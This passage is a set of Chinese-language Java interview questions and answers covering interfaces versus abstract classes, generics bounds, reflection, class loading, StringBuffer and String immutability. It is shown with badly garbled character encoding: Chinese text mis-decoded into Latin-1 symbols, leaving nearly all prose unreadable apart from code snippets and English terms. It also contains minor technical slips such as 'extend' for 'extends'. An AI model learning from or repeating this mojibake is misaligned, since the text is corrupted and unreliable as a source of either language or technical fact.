æ•°ï¼Œå®ƒç”¨æ¥å†³å®šè¾“å…¥å‚æ•°æ˜¯å¦å’Œcomparatorç›¸ç­‰ã€‚åªæœ‰å½“è¾“å…¥å‚æ•°ä¹Ÿæ˜¯ä¸€ä¸ªcomparatorå¹¶ä¸”è¾“å…¥å‚æ•°å’Œå½“å‰comparatorçš„æ’åºç»“æœæ˜¯ç›¸åŒçš„æ—¶å€™ï¼Œè¿™ä¸ªæ–¹æ³•æ‰è¿”å›trueã€‚ æ¥å£å’ŒæŠ½è±¡ç±»çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ Javaæä¾›å’Œæ”¯æŒåˆ›å»ºæŠ½è±¡ç±»å’Œæ¥å£ã€‚å®ƒä»¬çš„å®ç°æœ‰å…±åŒç‚¹ï¼Œä¸åŒç‚¹åœ¨äºï¼šæ¥å£ä¸­æ‰€æœ‰çš„æ–¹æ³•éšå«çš„éƒ½æ˜¯æŠ½è±¡çš„ã€‚è€ŒæŠ½è±¡ç±»åˆ™å¯ä»¥åŒæ—¶åŒ…å«æŠ½è±¡å’ŒéæŠ½è±¡çš„æ–¹æ³•ã€‚ç±»å¯ä»¥å®ç°å¾ˆå¤šä¸ªæ¥å£ï¼Œä½†æ˜¯åªèƒ½ç»§æ‰¿ä¸€ä¸ªæŠ½è±¡ç±»ç±»å¯ä»¥ä¸å®ç°æŠ½è±¡ç±»å’Œæ¥å£å£°æ˜çš„æ‰€æœ‰æ–¹æ³•ï¼Œå½“ç„¶ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç±»ä¹Ÿå¿…é¡»å¾—å£°æ˜æˆæ˜¯æŠ½è±¡çš„ã€‚æŠ½è±¡ç±»å¯ä»¥åœ¨ä¸æä¾›æ¥å£æ–¹æ³•å®ç°çš„æƒ…å†µä¸‹å®ç°æ¥å£ã€‚Javaæ¥å£ä¸­å£°æ˜çš„å˜é‡é»˜è®¤éƒ½æ˜¯finalçš„ã€‚æŠ½è±¡ç±»å¯ä»¥åŒ…å«éfinalçš„å˜é‡ã€‚Javaæ¥å£ä¸­çš„æˆå‘˜å‡½æ•°é»˜è®¤æ˜¯publicçš„ã€‚æŠ½è±¡ç±»çš„æˆå‘˜å‡½æ•°å¯ä»¥æ˜¯privateï¼Œprotectedæˆ–è€…æ˜¯publicã€‚æ¥å£æ˜¯ç»å¯¹æŠ½è±¡çš„ï¼Œä¸å¯ä»¥è¢«å®ä¾‹åŒ–ã€‚æŠ½è±¡ç±»ä¹Ÿä¸å¯ä»¥è¢«å®ä¾‹åŒ–ï¼Œä½†æ˜¯ï¼Œå¦‚æœå®ƒåŒ…å«mainæ–¹æ³•çš„è¯æ˜¯å¯ä»¥è¢«è°ƒç”¨çš„ã€‚ä¹Ÿå¯ä»¥å‚è€ƒJDK8ä¸­æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ« è¯·è¯´æ˜Javaæ˜¯å¦æ”¯æŒå¤šç»§æ‰¿ï¼Ÿ Javaä¸­ç±»ä¸æ”¯æŒå¤šç»§æ‰¿ï¼Œåªæ”¯æŒå•ç»§æ‰¿ï¼ˆå³ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªçˆ¶ç±»ï¼‰ã€‚ ä½†æ˜¯javaä¸­çš„æ¥å£æ”¯æŒå¤šç»§æ‰¿ï¼Œï¼Œå³ä¸€ä¸ªå­æ¥å£å¯ä»¥æœ‰å¤šä¸ªçˆ¶æ¥å£ã€‚ï¼ˆæ¥å£çš„ä½œç”¨æ˜¯ç”¨æ¥æ‰©å±•å¯¹è±¡çš„åŠŸèƒ½ï¼Œä¸€ä¸ªå­æ¥å£ç»§æ‰¿å¤šä¸ªçˆ¶æ¥å£ï¼Œè¯´æ˜å­æ¥å£æ‰©å±•äº†å¤šä¸ªåŠŸèƒ½ï¼Œå½“ç±»å®ç°æ¥å£æ—¶ï¼Œç±»å°±æ‰©å±•äº†ç›¸åº”çš„åŠŸèƒ½ï¼‰ã€‚ å¦‚ä½•é€šè¿‡åå°„åˆ›å»ºå¯¹è±¡ï¼Ÿ æ–¹æ³•1ï¼šé€šè¿‡ç±»å¯¹è±¡è°ƒç”¨newInstance()æ–¹æ³•ï¼Œä¾‹å¦‚ï¼šString.class.newInstance() æ–¹æ³•2ï¼šé€šè¿‡ç±»å¯¹è±¡çš„getConstructor()æˆ–getDeclaredConstructor()æ–¹æ³•è·å¾—æ„é€ å™¨ï¼ˆConstructorï¼‰å¯¹è±¡å¹¶è°ƒç”¨å…¶newInstance()æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼Œä¾‹å¦‚ï¼šString.class.getConstructor(String.class).newInstance(â€œHelloâ€); æ˜¯å¦å¯ä»¥åœ¨staticç¯å¢ƒä¸­è®¿é—®éstaticå˜é‡ï¼Ÿstaticå˜é‡åœ¨Javaä¸­æ˜¯å±äºç±»çš„ï¼Œå®ƒåœ¨æ‰€æœ‰çš„å®ä¾‹ä¸­çš„å€¼æ˜¯ä¸€æ ·çš„ã€‚å½“ç±»è¢«Javaè™šæ‹Ÿæœºè½½å…¥çš„æ—¶å€™ï¼Œä¼šå¯¹staticå˜é‡è¿›è¡Œåˆå§‹åŒ–ã€‚å¦‚æœä½ çš„ä»£ç å°è¯•ä¸ç”¨å®ä¾‹æ¥è®¿é—®éstaticçš„å˜é‡ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ï¼Œå› ä¸ºè¿™äº›å˜é‡è¿˜æ²¡æœ‰è¢«åˆ›å»ºå‡ºæ¥ï¼Œè¿˜æ²¡æœ‰è·Ÿä»»ä½•å®ä¾‹å…³è”ä¸Šã€‚ extends å’Œsuper æ³›å‹é™å®šç¬¦ï¼ˆ1ï¼‰æ³›å‹ä¸­ä¸Šç•Œå’Œä¸‹ç•Œçš„å®šä¹‰ ä¸Šç•Œ&lt;? extend Fruit&gt; ä¸‹ç•Œ&lt;? super Apple&gt; ï¼ˆ2ï¼‰ä¸Šç•Œå’Œä¸‹ç•Œçš„ç‰¹ç‚¹ ä¸Šç•Œçš„liståªèƒ½getï¼Œä¸èƒ½addï¼ˆç¡®åˆ‡åœ°è¯´ä¸èƒ½addå‡ºé™¤nullä¹‹å¤–çš„å¯¹è±¡ï¼ŒåŒ…æ‹¬Objectï¼‰ ä¸‹ç•Œçš„liståªèƒ½addï¼Œä¸èƒ½get ï¼ˆ3ï¼‰ç¤ºä¾‹ä»£ç  import java.util.ArrayList; import java.util.List; class Fruit {} class Apple extends Fruit {} class Jonathan extends Apple {} class Orange extends Fruit {} public class CovariantArrays { public static void main(String[] args) { //ä¸Šç•Œ List&lt;? extends Fruit&gt; flistTop = new ArrayList&lt;Apple&gt;(); flistTop.add(null); //add Fruitå¯¹è±¡ä¼šæŠ¥é”™ //flist.add(new Fruit()); Fruit fruit1 = flistTop.get(0); //ä¸‹ç•Œ List&lt;? super Apple&gt; flistBottem = new ArrayList&lt;Apple&gt;(); flistBottem.add(new Apple()); flistBottem.add(new Jonathan()); //get Appleå¯¹è±¡ä¼šæŠ¥é”™ //Apple apple = flistBottem.get(0); } } ï¼ˆ4ï¼‰ä¸Šç•Œ&lt;? extend Fruit&gt; ï¼Œè¡¨ç¤ºæ‰€æœ‰ç»§æ‰¿Fruitçš„å­ç±»ï¼Œä½†æ˜¯å…·ä½“æ˜¯å“ªä¸ªå­ç±»ï¼Œæ— æ³•ç¡®å®šï¼Œæ‰€ä»¥è°ƒç”¨addçš„æ—¶å€™ï¼Œè¦addä»€ä¹ˆç±»å‹ï¼Œè°ä¹Ÿä¸çŸ¥é“ã€‚ä½†æ˜¯getçš„æ—¶å€™ï¼Œä¸ç®¡æ˜¯ä»€ä¹ˆå­ç±»ï¼Œä¸ç®¡è¿½æº¯å¤šå°‘è¾ˆï¼Œè‚¯å®šæœ‰ä¸ªçˆ¶ç±»æ˜¯Fruitï¼Œæ‰€ä»¥ï¼Œæˆ‘éƒ½å¯ä»¥ç”¨æœ€å¤§çš„çˆ¶ç±»Fruitæ¥ç€ï¼Œä¹Ÿå°±æ˜¯æŠŠæ‰€æœ‰çš„å­ç±»å‘ä¸Šè½¬å‹ä¸ºFruitã€‚ ä¸‹ç•Œ&lt;? super Apple&gt;ï¼Œè¡¨ç¤ºAppleçš„æ‰€æœ‰çˆ¶ç±»ï¼ŒåŒ…æ‹¬Fruitï¼Œä¸€ç›´å¯ä»¥è¿½æº¯åˆ°è€ç¥–å®—Object ã€‚é‚£ä¹ˆå½“æˆ‘addçš„æ—¶å€™ï¼Œæˆ‘ä¸èƒ½add Appleçš„çˆ¶ç±»ï¼Œå› ä¸ºä¸èƒ½ç¡®å®šListé‡Œé¢å­˜æ”¾çš„åˆ°åº•æ˜¯å“ªä¸ªçˆ¶ç±»ã€‚ä½†æ˜¯æˆ‘å¯ä»¥add AppleåŠå…¶å­ç±»ã€‚å› ä¸ºä¸ç®¡æˆ‘çš„å­ç±»æ˜¯ä»€ä¹ˆç±»å‹ï¼Œå®ƒéƒ½å¯ä»¥å‘ä¸Šè½¬å‹ä¸ºAppleåŠå…¶æ‰€æœ‰çš„çˆ¶ç±»ç”šè‡³è½¬å‹ä¸ºObject ã€‚ä½†æ˜¯å½“æˆ‘getçš„æ—¶å€™ï¼ŒAppleçš„çˆ¶ç±»è¿™ä¹ˆå¤šï¼Œæˆ‘ç”¨ä»€ä¹ˆæ¥ç€å‘¢ï¼Œé™¤äº†Objectï¼Œå…¶ä»–çš„éƒ½æ¥ä¸ä½ã€‚ æ‰€ä»¥ï¼Œå½’æ ¹ç»“åº•å¯ä»¥ç”¨ä¸€å¥è¯è¡¨ç¤ºï¼Œé‚£å°±æ˜¯ç¼–è¯‘å™¨å¯ä»¥æ”¯æŒå‘ä¸Šè½¬å‹ï¼Œä½†ä¸æ”¯æŒå‘ä¸‹è½¬å‹ã€‚å…·ä½“æ¥è®²ï¼Œæˆ‘å¯ä»¥æŠŠAppleå¯¹è±¡èµ‹å€¼ç»™Fruitçš„å¼•ç”¨ï¼Œä½†æ˜¯å¦‚æœæŠŠFruitå¯¹è±¡èµ‹å€¼ç»™Appleçš„å¼•ç”¨å°±å¿…é¡»å¾—ç”¨castã€‚ ä»€ä¹ˆæ˜¯æ³›å‹ï¼Ÿ æ³›å‹ï¼Œå³â€œå‚æ•°åŒ–ç±»å‹â€ã€‚ä¸€æåˆ°å‚æ•°ï¼Œæœ€ç†Ÿæ‚‰çš„å°±æ˜¯å®šä¹‰æ–¹æ³•æ—¶æœ‰å½¢å‚ï¼Œç„¶åè°ƒç”¨æ­¤æ–¹æ³•æ—¶ä¼ é€’å®å‚ã€‚é‚£ä¹ˆå‚æ•°åŒ–ç±»å‹æ€ä¹ˆç†è§£å‘¢ï¼Ÿé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å°†ç±»å‹ç”±åŸæ¥çš„å…·ä½“çš„ç±»å‹å‚æ•°åŒ–ï¼Œç±»ä¼¼äºæ–¹æ³•ä¸­çš„å˜é‡å‚æ•°ï¼Œæ­¤æ—¶ç±»å‹ä¹Ÿå®šä¹‰æˆå‚æ•°å½¢å¼ï¼ˆå¯ä»¥ç§°ä¹‹ä¸ºç±»å‹å½¢å‚ï¼‰ï¼Œç„¶ååœ¨ä½¿ç”¨/è°ƒç”¨æ—¶ä¼ å…¥å…·ä½“çš„ç±»å‹ï¼ˆç±»å‹å®å‚ï¼‰ã€‚ public class GenericTest { public static void main(String[] args) { /* List list = new ArrayList(); list.add(&quot;qqyumidi&quot;); list.add(&quot;corn&quot;); list.add(100); */ List&lt;String&gt; list = new ArrayList&lt;String&gt;(); list.add(&quot;qqyumidi&quot;); list.add(&quot;corn&quot;); //list.add(100); // 1 æç¤ºç¼–è¯‘é”™è¯¯ for (int i = 0; i &lt; list.size(); i++) { String name = list.get(i); // 2 System.out.println(&quot;name:&quot; + name); } } } é‡‡ç”¨æ³›å‹å†™æ³•åï¼Œåœ¨//1å¤„æƒ³åŠ å…¥ä¸€ä¸ªIntegerç±»å‹çš„å¯¹è±¡æ—¶ä¼šå‡ºç°ç¼–è¯‘é”™è¯¯ï¼Œé€šè¿‡Listï¼Œç›´æ¥é™å®šäº†listé›†åˆä¸­åªèƒ½å«æœ‰Stringç±»å‹çš„å…ƒç´ ï¼Œä»è€Œåœ¨//2å¤„æ— é¡»è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œå› ä¸ºæ­¤æ—¶ï¼Œé›†åˆèƒ½å¤Ÿè®°ä½å…ƒç´ çš„ç±»å‹ä¿¡æ¯ï¼Œç¼–è¯‘å™¨å·²ç»èƒ½å¤Ÿç¡®è®¤å®ƒæ˜¯Stringç±»å‹äº†ã€‚ é™æ€å˜é‡å­˜åœ¨ä»€ä¹ˆä½ç½®æ–¹æ³•åŒº è§£é‡Šç±»åŠ è½½æœºåˆ¶ï¼ŒåŒäº²å§”æ´¾æ¨¡å‹ï¼Œå¥½å¤„æ˜¯ä»€ä¹ˆï¼ŸæŸä¸ªç‰¹å®šçš„ç±»åŠ è½½å™¨åœ¨æ¥åˆ°åŠ è½½ç±»çš„è¯·æ±‚æ—¶ï¼Œ é¦–å…ˆå°†åŠ è½½ä»»åŠ¡å§”æ‰˜ç»™çˆ¶ç±»åŠ è½½å™¨ï¼Œä¾æ¬¡é€’å½’ï¼Œå¦‚æœçˆ¶ç±»åŠ è½½å™¨å¯ä»¥å®Œæˆç±»åŠ è½½ä»»åŠ¡ï¼Œå°±æˆåŠŸè¿”å›ï¼›åªæœ‰çˆ¶ç±»åŠ è½½å™¨æ— æ³•å®Œæˆæ­¤åŠ è½½ä»»åŠ¡æ—¶ï¼Œæ‰è‡ªå·±å»åŠ è½½ã€‚ ä½¿ç”¨åŒäº²å§”æ´¾æ¨¡å‹çš„å¥½å¤„åœ¨äºä½¿ç”¨åŒäº²å§”æ´¾æ¨¡å‹çš„å¥½å¤„åœ¨äºJavaç±»éšç€å®ƒçš„ç±»åŠ è½½å™¨ä¸€èµ·å…·å¤‡äº†ä¸€ç§å¸¦æœ‰ä¼˜å…ˆçº§çš„å±‚æ¬¡å…³ç³»ã€‚ä¾‹å¦‚ç±»java.lang.Objectï¼Œå®ƒå­˜åœ¨åœ¨rt.jarä¸­ï¼Œæ— è®ºå“ªä¸€ä¸ªç±»åŠ è½½å™¨è¦åŠ è½½è¿™ä¸ªç±»ï¼Œæœ€ç»ˆéƒ½æ˜¯å§”æ´¾ç»™å¤„äºæ¨¡å‹æœ€é¡¶ç«¯çš„Bootstrap ClassLoaderè¿›è¡ŒåŠ è½½ï¼Œå› æ­¤Objectç±»åœ¨ç¨‹åºçš„å„ç§ç±»åŠ è½½å™¨ç¯å¢ƒä¸­éƒ½æ˜¯åŒä¸€ä¸ªç±»ã€‚ç›¸åï¼Œå¦‚æœæ²¡æœ‰åŒäº²å§”æ´¾æ¨¡å‹è€Œæ˜¯ç”±å„ä¸ªç±»åŠ è½½å™¨è‡ªè¡ŒåŠ è½½çš„è¯ï¼Œå¦‚æœç”¨æˆ·ç¼–å†™äº†ä¸€ä¸ªjava.lang.Objectçš„åŒåç±»å¹¶æ”¾åœ¨ClassPathä¸­ï¼Œé‚£ç³»ç»Ÿä¸­å°†ä¼šå‡ºç°å¤šä¸ªä¸åŒçš„Objectç±»ï¼Œç¨‹åºå°†æ··ä¹±ã€‚å› æ­¤ï¼Œå¦‚æœå¼€å‘è€…å°è¯•ç¼–å†™ä¸€ä¸ªä¸rt.jarç±»åº“ä¸­é‡åçš„Javaç±»ï¼Œå¯ä»¥æ­£å¸¸ç¼–è¯‘ï¼Œä½†æ˜¯æ°¸è¿œæ— æ³•è¢«åŠ è½½è¿è¡Œã€‚ åŒäº²å§”æ´¾æœºåˆ¶çš„æ„ä¹‰ä¸»è¦æ˜¯ä¿æŠ¤ä¸€äº›åŸºæœ¬ç±»ä¸å—å½±å“ã€‚æ¯”å¦‚å¸¸ç”¨çš„ Stringç±»ï¼Œ å…¶å…¨é™å®šåæ˜¯ java.lang.Stringï¼Œ åªæ˜¯ java.lang è¿™ä¸ªåŒ…ä¸‹çš„ç±»åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ä¸ç”¨ import è€Œç›´æ¥ä½¿ç”¨ã€‚åƒè¿™ç§åŸºæœ¬ç±» æŒ‰ç…§åŒäº²å§”æ´¾æœºåˆ¶ éƒ½åº”è¯¥ä» rt.jar é‡Œå»è·å–ï¼Œè€Œä¸åº”è¯¥ä»è‡ªå®šä¹‰åŠ è½½å™¨é‡Œå»è·å–æŸä¸ªå¼€å‘äººå‘˜è‡ªå·±å†™çš„ java.lang.String, æ¯•ç«Ÿå¼€å‘äººå‘˜è‡ªå·±å†™çš„ java.lang.String å¯èƒ½æœ‰å¾ˆå¤š bug, é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ— è®ºå¦‚ä½•å¤§å®¶ä½¿ç”¨çš„éƒ½æ˜¯ rt.jar é‡Œçš„ java.lang.String ç±»äº†ã€‚ è¯·ä½ è°ˆè°ˆStringBufferå’ŒStringBuilderæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåº•å±‚å®ç°ä¸Šå‘¢ï¼ŸStringBufferçº¿ç¨‹å®‰å…¨ï¼ŒStringBuilderçº¿ç¨‹ä¸å®‰å…¨ï¼Œ åº•å±‚å®ç°ä¸Šçš„è¯ï¼ŒStringBufferå…¶å®å°±æ˜¯æ¯”StringBuilderå¤šäº†Synchronizedä¿®é¥°ç¬¦ã€‚ è¯·è¯´æ˜Stringæ˜¯å¦èƒ½èƒ½ç»§æ‰¿ï¼Ÿ ä¸èƒ½ï¼Œcharæ•°ç»„ç”¨finalä¿®é¥°çš„ã€‚ è¯´æ˜â€staticâ€å…³é”®å­—æ˜¯ä»€ä¹ˆæ„æ€ï¼ŸJavaä¸­æ˜¯å¦å¯ä»¥è¦†ç›–(override)ä¸€ä¸ªprivateæˆ–è€…æ˜¯staticçš„æ–¹æ³•ï¼Ÿ â€œstaticâ€å…³é”®å­—è¡¨æ˜ä¸€ä¸ªæˆå‘˜å˜é‡æˆ–è€…æ˜¯æˆå‘˜æ–¹æ³•å¯ä»¥åœ¨æ²¡æœ‰æ‰€å±çš„ç±»çš„å®ä¾‹å˜é‡çš„æƒ…å†µä¸‹è¢«è®¿é—®ã€‚Javaä¸­staticæ–¹æ³•ä¸èƒ½è¢«è¦†ç›–ï¼Œå› ä¸ºæ–¹æ³•è¦†ç›–æ˜¯åŸºäºè¿è¡Œæ—¶åŠ¨æ€ç»‘å®šçš„ï¼Œè€Œstaticæ–¹æ³•æ˜¯ç¼–è¯‘æ—¶é™æ€ç»‘å®šçš„ã€‚staticæ–¹æ³•è·Ÿç±»çš„ä»»ä½•å®ä¾‹éƒ½ä¸ç›¸å…³ï¼Œæ‰€ä»¥æ¦‚å¿µä¸Šä¸é€‚ç”¨ã€‚ è¯·è¯´æ˜é‡è½½å’Œé‡å†™çš„åŒºåˆ«ï¼Œç›¸åŒå‚æ•°ä¸åŒè¿”å›å€¼èƒ½é‡è½½å—ï¼Ÿé‡è½½(Overloading) ï¼ˆ1ï¼‰ æ–¹æ³•é‡è½½æ˜¯è®©ç±»ä»¥ç»Ÿä¸€çš„æ–¹å¼å¤„ç†ä¸åŒç±»å‹æ•°æ®çš„ä¸€ç§æ‰‹æ®µã€‚å¤šä¸ªåŒåå‡½æ•°åŒæ—¶å­˜åœ¨ï¼Œå…·æœ‰ä¸åŒçš„å‚æ•°ä¸ªæ•°/ç±»å‹ã€‚ é‡è½½Overloadingæ˜¯ä¸€ä¸ªç±»ä¸­å¤šæ€æ€§çš„ä¸€ç§è¡¨ç°ã€‚ ï¼ˆ2ï¼‰ Javaçš„æ–¹æ³•é‡è½½ï¼Œå°±æ˜¯åœ¨ç±»ä¸­å¯ä»¥åˆ›å»ºå¤šä¸ªæ–¹æ³•ï¼Œå®ƒä»¬å…·æœ‰ç›¸åŒçš„åå­—ï¼Œä½†å…·æœ‰ä¸åŒçš„å‚æ•°å’Œä¸åŒçš„å®šä¹‰ã€‚ è°ƒç”¨æ–¹æ³•æ—¶é€šè¿‡ä¼ é€’ç»™å®ƒä»¬çš„ä¸åŒå‚æ•°ä¸ªæ•°å’Œå‚æ•°ç±»å‹æ¥å†³å®šå…·ä½“ä½¿ç”¨å“ªä¸ªæ–¹æ³•, è¿™å°±æ˜¯å¤šæ€æ€§ã€‚ ï¼ˆ3ï¼‰ é‡è½½çš„æ—¶å€™ï¼Œæ–¹æ³•åè¦ä¸€æ ·ï¼Œä½†æ˜¯å‚æ•°ç±»å‹å’Œä¸ªæ•°ä¸ä¸€æ ·ï¼Œè¿”å›å€¼ç±»å‹å¯ä»¥ç›¸åŒä¹Ÿå¯ä»¥ä¸ç›¸åŒã€‚æ— æ³•ä»¥è¿”å›å‹åˆ«ä½œä¸ºé‡è½½å‡½æ•°çš„åŒºåˆ†æ ‡å‡†ã€‚ é‡å†™ï¼ˆOverridingï¼‰ ï¼ˆ1ï¼‰ çˆ¶ç±»ä¸å­ç±»ä¹‹é—´çš„å¤šæ€æ€§ï¼Œå¯¹çˆ¶ç±»çš„å‡½æ•°è¿›è¡Œé‡æ–°å®šä¹‰ã€‚å¦‚æœåœ¨å­ç±»ä¸­å®šä¹‰æŸæ–¹æ³•ä¸å…¶çˆ¶ç±»æœ‰ç›¸åŒçš„åç§°å’Œå‚æ•°ï¼Œæˆ‘ä»¬è¯´è¯¥æ–¹æ³•è¢«é‡å†™ (Overriding)ã€‚åœ¨Javaä¸­ï¼Œå­ç±»å¯ç»§æ‰¿çˆ¶ç±»ä¸­çš„æ–¹æ³•ï¼Œè€Œä¸éœ€è¦é‡æ–°ç¼–å†™ç›¸åŒçš„æ–¹æ³•ã€‚ ä½†æœ‰æ—¶å­ç±»å¹¶ä¸æƒ³åŸå°ä¸åŠ¨åœ°ç»§æ‰¿çˆ¶ç±»çš„æ–¹æ³•ï¼Œè€Œæ˜¯æƒ³ä½œä¸€å®šçš„ä¿®æ”¹ï¼Œè¿™å°±éœ€è¦é‡‡ç”¨æ–¹æ³•çš„é‡å†™ã€‚ æ–¹æ³•é‡å†™åˆç§°æ–¹æ³•è¦†ç›–ã€‚ ï¼ˆ2ï¼‰è‹¥å­ç±»ä¸­çš„æ–¹æ³•ä¸çˆ¶ç±»ä¸­çš„æŸä¸€æ–¹æ³•å…·æœ‰ç›¸åŒçš„æ–¹æ³•åã€è¿”å›ç±»å‹å’Œå‚æ•°è¡¨ï¼Œåˆ™æ–°æ–¹æ³•å°†è¦†ç›–åŸæœ‰çš„æ–¹æ³•ã€‚ å¦‚éœ€çˆ¶ç±»ä¸­åŸæœ‰çš„æ–¹æ³•ï¼Œå¯ä½¿ç”¨superå…³é”®å­—ï¼Œè¯¥å…³é”®å­—å¼•ç”¨äº†å½“å‰ç±»çš„çˆ¶ç±»ã€‚ ï¼ˆ3ï¼‰å­ç±»å‡½æ•°çš„è®¿é—®ä¿®é¥°æƒé™ä¸èƒ½å°‘äºçˆ¶ç±»çš„ã€‚ è¯·åˆ—ä¸¾ä½ æ‰€çŸ¥é“çš„Objectç±»çš„æ–¹æ³•å¹¶ç®€è¦è¯´æ˜ã€‚Object()é»˜è®¤æ„é€ æ–¹æ³•ã€‚ clone() åˆ›å»ºå¹¶è¿”å›æ­¤å¯¹è±¡çš„ä¸€ä¸ªå‰¯æœ¬ã€‚ equals(Object obj) æŒ‡ç¤ºæŸä¸ªå…¶ä»–å¯¹è±¡æ˜¯å¦ä¸æ­¤å¯¹è±¡â€œç›¸ç­‰â€ã€‚ finalize()å½“åƒåœ¾å›æ”¶å™¨ç¡®å®šä¸å­˜åœ¨å¯¹è¯¥å¯¹è±¡çš„æ›´å¤šå¼•ç”¨æ—¶ï¼Œç”±å¯¹è±¡çš„åƒåœ¾å›æ”¶å™¨è°ƒç”¨æ­¤æ–¹æ³•ã€‚ getClass()è¿”å›ä¸€ä¸ªå¯¹è±¡çš„è¿è¡Œæ—¶ç±»ã€‚ hashCode()è¿”å›è¯¥å¯¹è±¡çš„å“ˆå¸Œç å€¼ã€‚ notify()å”¤é†’åœ¨æ­¤å¯¹è±¡ç›‘è§†å™¨ä¸Šç­‰å¾…çš„å•ä¸ªçº¿ç¨‹ã€‚ notifyAll()å”¤é†’åœ¨æ­¤å¯¹è±¡ç›‘è§†å™¨ä¸Šç­‰å¾…çš„æ‰€æœ‰çº¿ç¨‹ã€‚ toString()è¿”å›è¯¥å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚ wait()å¯¼è‡´å½“å‰çš„çº¿ç¨‹ç­‰å¾…ï¼Œç›´åˆ°å…¶ä»–çº¿ç¨‹è°ƒç”¨æ­¤å¯¹è±¡çš„ notify() æ–¹æ³•æˆ– notifyAll() æ–¹æ³•ã€‚ wait(long timeout)å¯¼è‡´å½“å‰çš„çº¿ç¨‹ç­‰å¾…ï¼Œç›´åˆ°å…¶ä»–çº¿ç¨‹è°ƒç”¨æ­¤å¯¹è±¡çš„ notify() æ–¹æ³•æˆ– notifyAll() æ–¹æ³•ï¼Œæˆ–è€…è¶…è¿‡æŒ‡å®šçš„æ—¶é—´é‡ã€‚ wait(long timeout, int nanos) å¯¼è‡´å½“å‰çš„çº¿ç¨‹ç­‰å¾…ï¼Œç›´åˆ°å…¶ä»–çº¿ç¨‹è°ƒç”¨æ­¤å¯¹è±¡çš„ notify() æ–¹æ³•æˆ– notifyAll() æ–¹æ³•ï¼Œæˆ–è€…å…¶ä»–æŸä¸ªçº¿ç¨‹ä¸­æ–­å½“å‰çº¿ç¨‹ï¼Œæˆ–è€…å·²è¶…è¿‡æŸä¸ªå®é™…æ—¶é—´é‡ã€‚ ç±»å’Œå¯¹è±¡çš„åŒºåˆ«1.ç±»æ˜¯å¯¹æŸä¸€ç±»äº‹ç‰©çš„æè¿°ï¼Œæ˜¯æŠ½è±¡çš„ï¼›è€Œå¯¹è±¡æ˜¯ä¸€ä¸ªå®å®åœ¨åœ¨çš„ä¸ªä½“ï¼Œæ˜¯ç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚ æ¯”å¦‚ï¼šâ€œäººâ€æ˜¯ä¸€ä¸ªç±»ï¼Œè€Œâ€œæ•™å¸ˆâ€åˆ™æ˜¯â€œäººâ€çš„ä¸€ä¸ªå®ä¾‹ã€‚ 2.å¯¹è±¡æ˜¯å‡½æ•°ã€å˜é‡çš„é›†åˆä½“ï¼›è€Œç±»æ˜¯ä¸€ç»„å‡½æ•°å’Œå˜é‡çš„é›†åˆä½“ï¼Œå³ç±»æ˜¯ä¸€ç»„å…·æœ‰ç›¸åŒå±æ€§çš„å¯¹è±¡é›†åˆä½“ã€‚ Stringä¸ºä»€ä¹ˆä¸å¯å˜ï¼Ÿä¸å¯å˜å¯¹è±¡æ˜¯æŒ‡ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€åœ¨å¯¹è±¡è¢«åˆ›å»ºä¹‹åå°±ä¸å†å˜åŒ–ã€‚ä¸å¯æ”¹å˜çš„æ„æ€å°±æ˜¯è¯´ï¼šä¸èƒ½æ”¹å˜å¯¹è±¡å†…çš„æˆå‘˜å˜é‡ï¼ŒåŒ…æ‹¬åŸºæœ¬æ•°æ®ç±»å‹çš„å€¼ä¸èƒ½æ”¹å˜ï¼Œå¼•ç”¨ç±»å‹çš„å˜é‡ä¸èƒ½æŒ‡å‘å…¶ä»–çš„å¯¹è±¡ï¼Œå¼•ç”¨ç±»å‹æŒ‡å‘çš„å¯¹è±¡çš„çŠ¶æ€ä¹Ÿä¸èƒ½æ”¹å˜ã€‚ String ä¸å¯å˜æ˜¯å› ä¸ºåœ¨ JDK ä¸­ String ç±»è¢«å£°æ˜ä¸ºä¸€ä¸ª final ç±»ï¼Œä¸”ç±»å†…éƒ¨çš„ value å­—èŠ‚æ•°ç»„ä¹Ÿæ˜¯ final çš„ï¼Œåªæœ‰å½“å­—ç¬¦ä¸²æ˜¯ä¸å¯å˜æ—¶å­—ç¬¦ä¸²æ± æ‰æœ‰å¯èƒ½å®ç°ï¼Œå­—ç¬¦ä¸²æ± çš„å®ç°å¯ä»¥åœ¨è¿è¡Œæ—¶èŠ‚çº¦å¾ˆå¤š heap ç©ºé—´ï¼Œå› ä¸ºä¸åŒçš„å­—ç¬¦ä¸²å˜é‡éƒ½æŒ‡å‘æ± ä¸­çš„åŒä¸€ä¸ªå­—ç¬¦ä¸²ï¼›å¦‚æœå­—ç¬¦ä¸²æ˜¯å¯å˜çš„åˆ™ä¼šå¼•èµ·å¾ˆä¸¥é‡çš„å®‰å…¨é—®é¢˜ï¼Œè­¬å¦‚æ•°æ®åº“çš„ç”¨æˆ·åå¯†ç éƒ½æ˜¯ä»¥å­—ç¬¦ä¸²çš„å½¢å¼ä¼ å…¥æ¥è·å¾—æ•°æ®åº“çš„è¿æ¥ï¼Œæˆ–è€…åœ¨ socket ç¼–ç¨‹ä¸­ä¸»æœºåå’Œç«¯å£éƒ½æ˜¯ä»¥å­—ç¬¦ä¸²çš„å½¢å¼ä¼ å…¥ï¼Œå› ä¸ºå­—ç¬¦ä¸²æ˜¯ä¸å¯å˜çš„ï¼Œæ‰€ä»¥å®ƒçš„å€¼æ˜¯ä¸å¯æ”¹å˜çš„ï¼Œå¦åˆ™é»‘å®¢ä»¬å¯ä»¥é’»åˆ°ç©ºå­æ”¹å˜å­—ç¬¦ä¸²æŒ‡å‘çš„å¯¹è±¡çš„å€¼é€ æˆå®‰å…¨æ¼æ´ï¼›å› 